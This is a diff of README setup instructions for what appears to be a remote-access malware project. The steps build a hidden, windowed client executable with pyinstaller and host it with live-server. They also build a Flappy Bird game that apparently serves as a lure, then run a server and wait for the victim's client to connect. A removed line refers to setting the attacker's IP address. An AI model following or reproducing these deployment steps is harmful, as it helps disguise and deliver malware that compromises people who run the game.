@@ -67,28 +67,29 @@ python -m pip install -r requirements.txt
 ```
 python -m pip install PyAudio-0.2.11-cp27-cp27m-win32.whl
 ```
-7. Set ip_address and port in server.py. The ip_address should be the attacker's IP address.
 
-8. Use pyinstaller to build the client binary
+7. Use pyinstaller to build the client binary
 ```
 python pyinstaller.py --onefile --windowed client.pyw
 ```
 **Skip the next 2 steps if you dont want to use the flappy bird game**
 
-9. Setup a local server to host the client.exe. Use [live-server](https://github.com/tapio/live-server)
-
-10. Use py2exe to build the flappy bird game
+8. Setup a local server to host the client.exe. Use [live-server](https://github.com/tapio/live-server)
+```
+live-server --port=8081
+```
+9. Use py2exe to build the flappy bird game
 ```
 python setup.py
 ```
 The exe for the flappy bird game will be in a folder called 'dist'
 
-11. Run the server
+10. Run the server
 ```
 python server.py
 ```
 
-12. Wait for the client to connect
+11. Wait for the client to connect
 
 # ToDo
 
